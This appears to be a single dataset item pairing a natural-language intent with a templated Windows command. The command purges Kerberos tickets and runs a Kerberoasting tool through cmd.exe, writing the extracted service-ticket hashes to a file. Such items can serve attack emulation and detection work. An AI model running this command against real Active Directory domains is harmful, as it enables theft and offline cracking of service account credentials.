# Natural language intent:
# Purge Kerberos tickets and run Kerberoasting using cmd.exe and PowerShell.

klist purge ; cmd.exe /c "${local_f}\${local_exec}" kerberoast ${flags} /outfile:"${local_f}\${outFile}"
